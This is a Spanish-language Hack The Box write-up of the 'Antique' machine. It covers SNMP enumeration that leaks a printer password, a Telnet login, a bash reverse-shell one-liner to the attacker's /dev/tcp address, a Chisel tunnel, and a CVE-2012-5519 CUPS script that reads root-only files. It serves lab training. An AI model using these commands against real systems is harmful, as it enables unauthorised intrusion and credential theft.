---
category: Hack The Box
tags:
  - eJPT
title: Machine Antique
comments: "true"
image: /assets/img/machines/Antique/Antiquebanner.jpeg
---
## Introducción

Antique es una máquina Linux de dificultad easy que plantea un escenario de explotación a través de servicios asociados a una impresora de red. Durante la fase de enumeración, se identifica que el servicio SNMP está expuesto y filtra credenciales válidas, las cuales permiten establecer una sesión mediante Telnet. Una vez dentro, se descubre que la impresora cuenta con un servicio de administración CUPS corriendo de forma local. Aprovechando ciertas funcionalidades de este servicio, es posible escalar privilegios y obtener la flag de root, completando así la maquina.

## Skills

- SNMP Enumeration
- Network Printer Abuse
- CUPS Exploitation

## Enumeración
Para comenzar con la fase de reconocimiento, se realizó un escaneo completo de puertos TCP, lo que permitió identificar que el puerto 23, correspondiente al servicio Telnet, se encontraba abierto. 
```bash
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.107
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-16 19:44 -04
Initiating SYN Stealth Scan at 19:44
Scanning 10.10.11.107 [65535 ports]
Discovered open port 23/tcp on 10.10.11.107
Completed SYN Stealth Scan at 19:44, 15.40s elapsed (65535 total ports)
Nmap scan report for 10.10.11.107
Host is up, received user-set (0.43s latency).
Scanned at 2025-06-16 19:44:22 -04 for 16s
Not shown: 65424 closed tcp ports (reset), 110 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
23/tcp open  telnet  syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 15.50 seconds
           Raw packets sent: 73595 (3.238MB) | Rcvd: 72412 (2.896MB)
```

### SNMP Enumeration

Luego del reconocimiento inicial, se procedió a realizar un escaneo de los principales puertos UDP, lo que reveló que el puerto 161/udp, correspondiente al protocolo SNMP, se encontraba abierto. 
```bash
❯ nmap -sU --top-ports 100 10.10.11.107
Nmap scan report for 10.10.11.107
Host is up (0.22s latency).
Not shown: 99 closed udp ports (port-unreach)
PORT    STATE SERVICE
161/udp open  snmp
```

Tras identificar que el SNMP estaba abierto, se utilizó la cadena de comunidad por defecto public junto con la herramienta snmpwalk para intentar obtener información sensible del sistema. El comando fue ejecutado especificando la versión 2c del protocolo y consultando el OID raíz (1). Como resultado, se obtuvo el nombre del dispositivo lo cual confirma que se trata de una impresora de red. Además, una de las respuestas contenía una secuencia de bytes la cual, al ser interpretada correctamente, revelaba las credenciales de acceso.
```bash
❯ snmpwalk -c public -v2c 10.10.11.107 1
SNMPv2-SMI::mib-2 = STRING: "HTB Printer"
SNMPv2-SMI::enterprises.11.2.3.9.1.1.13.0 = BITS: 50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 
33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135 
SNMPv2-SMI::enterprises.11.2.3.9.1.2.1.0 = No more variables left in this MIB View (It is past the end of the MIB tree)
```

La cadena codificada en formato BITS obtenida mediante SNMP fue procesada para extraer su contenido en texto claro. Para ello, se utilizó un comando que convierte los valores hexadecimales a ASCII mediante xxd. Esto permitió decodificar correctamente los bytes en crudo y revelar una posible contraseña: P@ssw0rd@123!! seguida de otros caracteres adicionales que parecen no formar parte del secreto principal. El comando utilizado fue:
```bash
❯ echo "50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 
33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135 " | xargs | xxd -ps -r
P@ssw0rd@123!!123q"2Rbs3CSs$4EuWGW(8i	IYaA"1&1A5#
```

## Network Printer Abuse

Una vez obtenidas las credenciales a través de SNMP, se intentó el acceso al servicio Telnet descubierto previamente en el puerto 23. La conexión fue exitosa, y el banner reveló que se trataba de un dispositivo HP JetDirect, confirmando que se trata de una impresora de red. se desplegaron las opciones de configuración disponibles, destacando el comando exec.
```bash
❯ telnet 10.10.11.107
Trying 10.10.11.107...
Connected to 10.10.11.107.
Escape character is '^]'.

HP JetDirect

Password: P@ssw0rd@123!!123

Please type "?" for HELP
> ?

To Change/Configure Parameters Enter:
Parameter-name: value <Carriage Return>

Parameter-name Type of value
ip: IP-address in dotted notation
subnet-mask: address in dotted notation (enter 0 for default)
default-gw: address in dotted notation (enter 0 for default)
syslog-svr: address in dotted notation (enter 0 for default)
idle-timeout: seconds in integers
set-cmnty-name: alpha-numeric string (32 chars max)
host-name: alpha-numeric string (upper case only, 32 chars max)
dhcp-config: 0 to disable, 1 to enable
allow: <ip> [mask] (0 to clear, list to display, 10 max)

addrawport: <TCP port num> (<TCP port num> 3000-9000)
deleterawport: <TCP port num>
listrawport: (No parameter required)

exec: execute system commands (exec id)
exit: quit from telnet session
> 
```

se utilizó un one-liner en Bash para establecer una reverse shell hacia la máquina atacante. El comando ejecutado permitió obtener una shell remota como usuario limitado en el sistema objetivo.
```telnet
> exec bash -c "bash -i >& /dev/tcp/10.10.16.6/443 0>&1"   
```

se dejó un listener activo a la espera de conexiones entrantes. proporcionando acceso interactivo como el usuario lp.
```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.6] from (UNKNOWN) [10.10.11.107] 46364
bash: cannot set terminal process group (1033): Inappropriate ioctl for device
bash: no job control in this shell
lp@antique:~$ 
```

### Captura flag usuario

```bash
lp@antique:~$ whoami
whoami
lp
lp@antique:~$ ls
ls
telnet.py
user.txt
lp@antique:~$ cat user.txt
cat user.txt
a1b853f4ac4e41819d927d5d116a989e
lp@antique:~$ 
```

## CUPS Exploitation

Durante la enumeración de servicios internos se identificó que el puerto 631, correspondiente al servicio CUPS (Common UNIX Printing System), se encuentra en escucha exclusivamente en la interfaz local (127.0.0.1). Esto indica que el panel de administración de CUPS está restringido al acceso local, lo que sugiere que para interactuar con él será necesario establecer un túnel o ejecutar comandos desde la propia máquina comprometida.
```bash
lp@antique:/tmp$ netstat -nat
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:23              0.0.0.0:*               LISTEN     
tcp        0      2 10.10.11.107:48038      10.10.16.6:443          ESTABLISHED
tcp        0      0 10.10.11.107:23         10.10.16.6:60282        ESTABLISHED
tcp        0      0 10.10.11.107:23         10.10.16.6:58550        ESTABLISHED
tcp       24      0 10.10.11.107:23         10.10.16.6:39520        CLOSE_WAIT 
tcp        0      0 10.10.11.107:48040      10.10.16.6:443          ESTABLISHED
tcp        0      0 10.10.11.107:48036      10.10.16.6:443          ESTABLISHED
tcp6       0      0 ::1:631                 :::*                    LISTEN     
```

Con el objetivo de acceder al servicio CUPS, el cual solo escucha localmente en el puerto 631, decidí utilizar Chisel, una herramienta que permite crear túneles reversos mediante HTTP. Para ello, inicié un servidor en mi máquina. Esto habilitó el modo reverse y dejó el servidor escuchando en el puerto 8000, a la espera de conexiones salientes desde la máquina víctima. 
```bash
❯git clone https://github.com/jpillora/chisel
❯ cd chisel
❯ sudo ./chisel server -p 8000 --reverse
2025/06/21 02:53:09 server: Reverse tunnelling enabled
2025/06/21 02:53:09 server: Fingerprint Lux+apu+2oRbxCFKgE7SIkMc6NoUUmRfI7iVxPoreCM=
2025/06/21 02:53:09 server: Listening on http://0.0.0.0:8000
```

Para establecer la conexión desde la máquina hacia mi servidor, primero descargué la versión precompilada de Chisel. Una vez descargado el archivo comprimido, lo descomprimí con gunzip, obteniendo así el binario chisel_1.7.7_linux_amd64.
```bash
❯ wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
❯ gunzip chisel_1.7.7_linux_amd64.gz
```

Para facilitar la transferencia del binario a la máquina, levanté un servidor HTTP local utilizando Python.
```
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Desde la máquina, descargue el binario de Chisel.
```bash
lp@antique:/tmp$ wget 10.10.16.6:80/chisel_1.7.7_linux_amd64
  http://10.10.16.6/chisel_1.7.7_linux_amd64
Connecting to 10.10.16.6:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 8077312 (7.7M) [application/octet-stream]
Saving to: ‘chisel_1.7.7_linux_amd64’

chisel_1.7.7_linux_ 100%[===================>]   7.70M  3.55MB/s    in 2.2s    

 (3.55 MB/s) - ‘chisel_1.7.7_linux_amd64’ saved [8077312/8077312]
```

Una vez descargado Chisel, le otorgue permisos de ejecución y configure un túnel reverso para exponer el servicio local de CUPS (port 631) de la máquina víctima hacia el host atacante.
```bash
lp@antique:/tmp$ chmod +x chisel_1.7.7_linux_amd64
lp@antique:/tmp$ ./chisel_1.7.7_linux_amd64 client 10.10.16.6:8000 R:9631:localhost:631
2025/06/21 07:20:53 client: Connecting to ws://10.10.16.6:8000
2025/06/21 07:20:56 client: Connected (Latency 163.66278ms)
```

Tras establecer el túnel reverso con Chisel, se accedió exitosamente a la interfaz web de administración de CUPS a través del puerto local 9631 (redirigido desde el puerto 631 de la máquina víctima). En la interfaz se visualiza la versión del servicio: CUPS 1.6.1.
![1](/assets/img/machines/Antique/1.jpeg)

### CVE-2012-5519
Tras identificar la versión vulnerable de CUPS (1.6.1) y confirmar la exposición local del servicio, se decide explotar la vulnerabilidad CVE-2012-5519 utilizando un script público llamado cups-root-file-read.sh. Este script abusa de las funciones de impresión de CUPS para acceder a archivos arbitrarios del sistema con permisos de root.

Se descarga el script en la máquina comprometida y, al ejecutarlo, permite leer directamente archivos restringidos, como la flag del usuario root, sin necesidad de escalar privilegios manualmente.
```bash
❯ git clone https://github.com/p1ckzi/CVE-2012-5519
❯ cd CVE-2012-5519
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
### Captura flag root

```bash
lp@antique:/tmp$ wget http://0.0.0.0:80/cups-root-file-read.sh
lp@antique:/tmp$ chmod +x cups-root-file-read.sh
lp@antique:/tmp$ bash cups-root-file-read.sh
                                            _
  ___ _   _ _ __  ___       _ __ ___   ___ | |_
 / __| | | | '_ \/ __|_____| '__/ _ \ / _ \| __|____
| (__| |_| | |_) \__ \_____| | | (_) | (_) | ||_____|
 \___|\__,_| .__/|___/     |_|  \___/ \___/ \__|
 / _(_) | _|_|      _ __ ___  __ _  __| |  ___| |__
| |_| | |/ _ \_____| '__/ _ \/ _` |/ _` | / __| '_ \ 
|  _| | |  __/_____| | |  __/ (_| | (_| |_\__ \ | | |
|_| |_|_|\___|     |_|  \___|\__,_|\__,_(_)___/_| |_|
a bash implementation of CVE-2012-5519 for linux.

[i] performing checks...
[i] checking for cupsctl command...
[+] cupsctl binary found in path.
[i] checking cups version...
[+] using cups 1.6.1. version may be vulnerable.
[i] checking user lp in lpadmin group...
[+] user part of lpadmin group.
[i] checking for curl command...
[+] curl binary found in path.
[+] all checks passed.

[!] warning!: this script will set the group ownership of
[!] viewed files to user 'lp'.
[!] files will be created as root and with group ownership of
[!] user 'lp' if a nonexistant file is submitted.
[!] changes will be made to /etc/cups/cups.conf file as part of the
[!] exploit. it may be wise to backup this file or copy its contents
[!] before running the script any further if this is a production
[!] environment and/or seek permissions beforehand.
[!] the nature of this exploit is messy even if you know what you're looking for.

[i] usage:
	input must be an absolute path to an existing file.
	eg.
	1. /root/.ssh/id_rsa
	2. /root/.bash_history
	3. /etc/shadow
	4. /etc/sudoers ... etc.
[i] cups-root-file-read.sh commands:
	type 'info' for exploit details.
	type 'help' for this dialog text.
	type 'quit' to exit the script.
[i] for more information on the limitations
[i] of the script and exploit, please visit:
[i] https://github.com/0zvxr/CVE-2012-5519/blob/main/README.md
/root/root.txt
[+] contents of /root/root.txt:
35b2593821d0d48ae2fd3431d3309625
```

